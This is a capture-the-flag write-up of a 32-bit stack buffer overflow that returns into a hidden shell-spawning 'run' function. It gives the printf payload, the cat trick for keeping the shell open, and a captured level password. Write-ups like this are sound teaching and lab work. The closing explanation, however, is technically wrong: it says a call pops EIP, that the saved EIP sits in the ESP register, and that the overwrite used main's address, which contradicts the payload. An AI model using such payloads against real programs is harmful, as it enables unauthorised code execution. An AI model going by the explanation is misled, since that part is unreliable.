# Write up

We have a `level1` file now, when we execute it, we are asked to write something.
When we write `test`, the program exits without any problem, but when we write something very long we get a Segmentation Fault.
We have to exploit a buffer overflow here.

Same thing, we download and disassemble the binary.
We notice a `run` function at the `0x08048444` address, this function call fwrite and system, we can assume that this function opens a shell.
We can confirm this by extracting the data section : `objdump -s -j .rodata bin1 > asm1_data.txt`
```
 8048568 03000000 01000200 476f6f64 2e2e2e20  ........Good... 
 8048578 57616974 20776861 743f0a00 2f62696e  Wait what?../bin
 8048588 2f736800                             /sh.            
```

The main function is located at the `0x08048480` address, and calls the gets function.
We will have to find a way to jump to the `0x08048444` address.

First we have to know the buffersize.
This line :
``` 
 8048486:	83 ec 50             	sub    $0x50,%esp
```
Show us that 80 (50 in hex) bytes are allocated in the stack.
The system is 32 bits (x86), so we have 4 bytes for the esp register and 76 for the buffer size.
We swipe the `run` address bytes and execute this payload :
```
printf "%76s%b" "" "\x44\x84\x04\x08" | ./level1
```
Which gives us :
```
Good... Wait what?
Segmentation fault (core dumped)
```

We got the shell, now we have to keep it by preventing the `EOF` input.
We can use the `cat` binary on the standard input to keep the hand on the shell.
```
(printf "%76s%bid" "" "\x44\x84\x04\x08"; cat) | ./level1
Good... Wait what?
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
Segmentation fault (core dumped)
```

## Explaination

When you call a function in ASM, you implicitly execute a POP EIP instruction to know from where you come.
The saved EIP will be stored in the ESP register and the stored address will be jumped to after a RET call.
By adding the `0x08048480` address after the buffer limit, we actually overwrite the ESP register contents.
The current main function contains a RET call, which makes the program thinks the address we overwrited is actually the saved EIP, which makes us jump to the unused function, Hooray !


## Sources

https://reverseengineering.stackexchange.com/questions/17075/stack-buffer-size-is-different-between-c-and-asm
https://www.coengoedegebure.com/buffer-overflow-attacks-explained/
https://beta.hackndo.com/stack-introduction/